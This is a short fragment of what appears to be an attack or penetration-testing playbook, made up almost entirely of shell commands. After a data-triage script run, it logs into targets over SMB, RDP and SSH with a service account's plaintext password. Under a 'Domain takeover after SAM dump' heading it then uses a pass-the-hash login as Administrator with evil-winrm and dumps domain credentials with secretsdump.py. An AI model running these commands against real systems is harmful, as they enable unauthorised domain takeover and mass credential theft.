...
python3 chunk_triage_pipe.py embeddings.npy --company example-corp --top 20 -o pipe.json
...
nxc smb TARGET -u svc-ts -p Password1
xfreerdp /v:TARGET /u:svc-ts /p:Password1 /d:DOMAIN /cert:ignore
ssh -i id_rsa svc-ts@UBUNTU_TARGET

# Domain takeover after SAM dump
evil-winrm -i dc-host -u Administrator -H 4309f10ed11d9a6c42b2ed50e8689f7c
secretsdump.py DOMAIN/Administrator@dc-host -hashes ':HASH' -outputfile domain_dump
```
